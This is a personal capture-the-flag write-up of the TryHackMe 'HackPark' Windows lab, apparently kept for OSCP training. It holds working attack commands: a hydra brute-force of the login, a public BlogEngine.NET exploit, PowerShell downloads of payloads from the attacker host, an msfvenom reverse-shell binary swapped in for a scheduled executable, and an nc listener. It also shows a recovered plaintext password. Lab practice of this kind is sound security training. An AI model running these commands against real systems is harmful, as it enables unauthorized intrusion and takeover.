kali@kali:~/oscptraining/tryhackme/hackpack$ nmap -sV -sC -o nmap 10.10.4.115
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-04 10:27 EDT
Nmap scan report for 10.10.4.115
Host is up (0.25s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 6 disallowed entries 
| /Account/*.* /search /search.aspx /error404.aspx 
|_/archive /archive.aspx
|_http-server-header: Microsoft-IIS/8.5
|_http-title: hackpark | hackpark amusements
3389/tcp open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=hackpark
| Not valid before: 2021-05-03T14:23:40
|_Not valid after:  2021-11-02T14:23:40
|_ssl-date: 2021-05-04T14:28:20+00:00; 0s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.04 seconds

port 80 and 3389 are open

 Windows website login form using POST method
<form method="post" action="login.aspx?ReturnURL=%2fadmin%2f" id="Form1">

the steps for to get the hydra command at the back is as follows
go to inspect element > network > edit and send the post request, copy referer:request body:failed message

hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.246.210 http-post-form "/Account/login.aspx?ReturnURL=%2fadmin%2f:__VIEWSTATE=kcSMO%2FXF1GCTeqt5uRKPoYMbob7ILPmcJ8MRMGNpv2FneCHIfEXPYOSXqtxv7DNoE8I3ocTwXLS9nE%2BFsrLJiHyETHd061sGnCLUvKIZ98Tw51yIvJPBPwCnvZkSPBN1IGUjaSXna2xuK3zLhKzuJMYEMGp%2BJaP2%2FnW3KLtiHdSkJNaf&__EVENTVALIDATION=An1jltDUr%2FrJuqK%2FrWVjD8jVjSf5VMWKvH%2BRo5qQE9Qj4eGYCBTjNSWsFE5%2FEkHkpfIodOJNXbmfoUTYDVGixWMGR8Uh4t4o5X9Rt16ieHoB4SXqj2wNQW3KckOfeclwpBQJbmdFBCPS%2FdzwfeBzvm1jPbMdBiH2IFcI0iE0FX3uIkeq&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed"

kali@kali:~/oscptraining/tryhackme/hackpack$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.4.115 http-post-form "/Account/login.aspx?ReturnURL=%2fadmin:__VIEWSTATE=grAt5ynSnVWRiGrtMIbnltxKq5lVYTU1mg05sjpBmyX97TJvxlMSbHFs8T%2FWMUhUug08dks8%2FQsmmBkhSMnoQUK95nyNN3NqFOJXm2L3PJWWZjMc4OwqLk8neyTQdVwcYZ34RXJwEDH9pc6FjyC4fkubmatuu5mLd0j7PLEF%2BwHTjChs&__EVENTVALIDATION=sOJdUWaZw6uOtm1onUPcsuxD1qsmegV89dt9hXwCxr7tkQqOODLMLBuOGwZH%2F7a5p5a2ifEAAj%2FTGtyOOlCZkWFqLKglFZPNe3M%2BRmbK%2FpOdwfZm0kJth0BHkioI68IKXV2dzSlVUAXZ7SGdIAWewsRNKjCJcb%2Bpl4C5GxT8fC%2FasZAR&ctl00%24MainContent%24LoginUser%24UserName=admin&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed"


[STATUS] 576.00 tries/min, 576 tries in 00:01h, 14343823 to do in 415:03h, 16 active
[80][http-post-form] host: 10.10.246.210   login: admin   password: 1qaz2wsx
1 of 1 target successfully completed, 1 valid password found                                                                 
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-12-27 11:22:32  


once im inside the admin page, we can see that it is running on BlogEngine.NET 3.3.6
a quick search on exploitdb would lead us to the following public exploit that we can use
kali@kali:~/oscptraining/tryhackme/hackpack$ searchsploit -p aspx/webapps/46353.cs
  Exploit: BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution
      URL: https://www.exploit-db.com/exploits/46353
     Path: /usr/share/exploitdb/exploits/aspx/webapps/46353.cs
File Type: HTML document, ASCII text, with CRLF line terminators

kali@kali:~/oscptraining/tryhackme/hackpack$ cp /usr/share/exploitdb/exploits/aspx/webapps/46353.cs .

Path traversal vulnerability 

follow the instructions and we are in!

lets enumerate the machine...


c:\windows\system32\inetsrv>whoami
iis apppool\blog
systeminfo
c:\windows\system32\inetsrv>systeminfo
Host Name:                 HACKPARK
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600


trying upgrade our reverse shell to a full reverseshell
powershell Invoke-WebRequest -Uri http://10.4.24.92:8000/reverse.exe -Outfile reverse.exe

get winpeas in 

powershell Invoke-WebRequest -Uri http://10.8.102.117:80/oscptraining/winpeas.bat -Outfile 'C:\Windows\Temp\winpeas.bat'


We are able to see windowsscheduler running so lets go

C:\Windows>cd C:\Program Files (x86)\SystemScheduler                                                                  
dir                                                                                                                   
C:\Program Files (x86)\SystemScheduler>dir                                                                            
 Volume in drive C has no label.                                                                                      
 Volume Serial Number is 0E97-C552                                                                                    
 Directory of C:\Program Files (x86)\SystemScheduler                                                                  
08/04/2019  04:37 AM    <DIR>          .                                                                              
08/04/2019  04:37 AM    <DIR>          ..                                                                             
05/17/2007  01:47 PM             1,150 alarmclock.ico                                                                 
08/31/2003  12:06 PM               766 clock.ico                                                                      
08/31/2003  12:06 PM            80,856 ding.wav                                                                       
05/04/2021  08:51 AM    <DIR>          Events                                                                         
08/04/2019  04:36 AM                60 Forum.url                                                                      
01/08/2009  08:21 PM         1,637,972 libeay32.dll                                                                   
11/16/2004  12:16 AM             9,813 License.txt                                                                    
05/04/2021  07:23 AM             1,496 LogFile.txt                                                                    
05/04/2021  07:24 AM             3,760 LogfileAdvanced.txt                                                            
03/25/2018  10:58 AM           536,992 Message.exe                                                                    
03/25/2018  10:59 AM           445,344 PlaySound.exe                                                                  
03/25/2018  10:58 AM            27,040 PlayWAV.exe                                                                    
08/04/2019  03:05 PM               149 Preferences.ini                                                                
03/25/2018  10:58 AM           485,792 Privilege.exe                                                                  
03/24/2018  12:09 PM            10,100 ReadMe.txt                                                                     
03/25/2018  10:58 AM           112,544 RunNow.exe                                                                     
03/25/2018  10:59 AM            40,352 sc32.exe                                                                       
08/31/2003  12:06 PM               766 schedule.ico                                                                   
03/25/2018  10:58 AM         1,633,696 Scheduler.exe                                                                  
03/25/2018  10:59 AM           491,936 SendKeysHelper.exe                                                             
03/25/2018  10:58 AM           437,664 ShowXY.exe                                                                     
03/25/2018  10:58 AM           439,712 ShutdownGUI.exe                                                                
03/25/2018  10:58 AM           235,936 SSAdmin.exe                                                                    
03/25/2018  10:58 AM           731,552 SSCmd.exe                                                                      
01/08/2009  08:12 PM           355,446 ssleay32.dll                                                                   
03/25/2018  10:58 AM           456,608 SSMail.exe                                                                     
08/04/2019  04:36 AM             6,999 unins000.dat                                                                   
08/04/2019  04:36 AM           722,597 unins000.exe                                                                   
08/04/2019  04:36 AM                54 Website.url                                                                    
06/26/2009  05:27 PM             6,574 whiteclock.ico                                                                 
03/25/2018  10:58 AM            76,704 WhoAmI.exe                                                                     
05/16/2006  04:49 PM           785,042 WSCHEDULER.CHM                                                                 
05/16/2006  03:58 PM             2,026 WScheduler.cnt                                                                 
03/25/2018  10:58 AM           331,168 WScheduler.exe                                                                 
05/16/2006  04:58 PM           703,081 WSCHEDULER.HLP                                                                 
03/25/2018  10:58 AM           136,096 WSCtrl.exe                                                                     
03/25/2018  10:58 AM            98,720 WService.exe                                                                   
03/25/2018  10:58 AM            68,512 WSLogon.exe                                                                    
03/25/2018  10:59 AM            33,184 WSProc.dll                                                                     
              38 File(s)     11,148,259 bytes                                                                         
               3 Dir(s)  39,120,097,280 bytes free    



C:\Program Files (x86)\SystemScheduler>cd Events                                                                      
dir                                                                                                                   
C:\Program Files (x86)\SystemScheduler\Events>dir                                                                     
 Volume in drive C has no label.                                                                                      
 Volume Serial Number is 0E97-C552                                                                                    
 Directory of C:\Program Files (x86)\SystemScheduler\Events                                                           
05/04/2021  08:54 AM    <DIR>          .                                                                              
05/04/2021  08:54 AM    <DIR>          ..                                                                             
05/04/2021  08:55 AM             1,926 20198415519.INI                                                                
05/04/2021  08:55 AM            29,877 20198415519.INI_LOG.txt                                                        
10/02/2020  02:50 PM               290 2020102145012.INI                                                              
05/04/2021  08:46 AM               186 Administrator.flg                                                              
05/04/2021  07:24 AM                 0 Scheduler.flg                                                                  
05/04/2021  08:46 AM                 0 service.flg                                                                    
05/04/2021  08:46 AM               449 SessionInfo.flg                                                                
05/04/2021  08:46 AM               182 SYSTEM_svc.flg                                                                 
               8 File(s)         32,910 bytes                                                                         
               2 Dir(s)  39,120,093,184 bytes free                                                                    
type Administrator.flg                                                                                                
C:\Program Files (x86)\SystemScheduler\Events>type Administrator.flg                                                  
[LatestSessionInfo]                                                                                                   
SessionID=1                                                                                                           
[Administrator1]                                                                                                      
Time=04/05/21 08:46:31                                                                                                
RemoteSession=0                                                                                                       
DesktopName=Default                                                                                                   
StationName=WinSta0                                                                                                   
SessionID=1                                                                                                           
ProcessID=1664                                                                                                        
UserID=Administrator   





Looking inside HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\WinLogon                                             
    LastUsedUsername    REG_SZ    administrator                                                                       
    DefaultUserName    REG_SZ    administrator                                                                        
    DefaultPassword    REG_SZ    4q6XvFES7Fdxs    

saw some password lurking
kali@kali:~/oscptraining$ xfreerdp /u:administrator /p:4q6XvFES7Fdxs /v:10.10.4.115

7e13d97f05f7ceb9881a3eb3d78d3e72


supposed to exploit message.exe that is running every 60s

msfvenom -p windows/shell_reverse_tcp LHOST=10.8.102.117 LPORT=8888 -f exe > message.exe


powershell Invoke-WebRequest -Uri http://10.8.102.117:80/Message.exe -Outfile 'C:\Program Files (x86)\SystemScheduler\Message.exe'

get it in then wait for it to execute and we get our reverse shell with admin privilege!


_______________________________________________________________________________________________________
kali@kali:~/oscptraining/tryhackme/hackpack$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [10.8.102.117] from (UNKNOWN) [10.10.16.37] 49336
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\PROGRA~2\SYSTEM~1>cd ..
cd ..

C:\PROGRA~2>whoami
whoami
hackpark\administrator

C:\PROGRA~2>


C:\Users\jeff\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0E97-C552

 Directory of C:\Users\jeff\Desktop

08/04/2019  11:55 AM    <DIR>          .
08/04/2019  11:55 AM    <DIR>          ..
08/04/2019  11:57 AM                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)  39,119,171,584 bytes free

C:\Users\jeff\Desktop>type user.txt
type user.txt
759bd8af507517bcfaede78a21a73e39
C:\Users\jeff\Desktop>


_______________________________________________________________________________________________________
C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0E97-C552

 Directory of C:\Users\Administrator\Desktop

08/04/2019  11:49 AM    <DIR>          .
08/04/2019  11:49 AM    <DIR>          ..
08/04/2019  11:51 AM                32 root.txt
08/04/2019  04:36 AM             1,029 System Scheduler.lnk
               2 File(s)          1,061 bytes
               2 Dir(s)  39,119,171,584 bytes free

C:\Users\Administrator\Desktop>type root.txt
type root.txt
7e13d97f05f7ceb9881a3eb3d78d3e72
C:\Users\Administrator\Desktop>

_______________________________________________________________________________________________________

completed 05 May 1126hr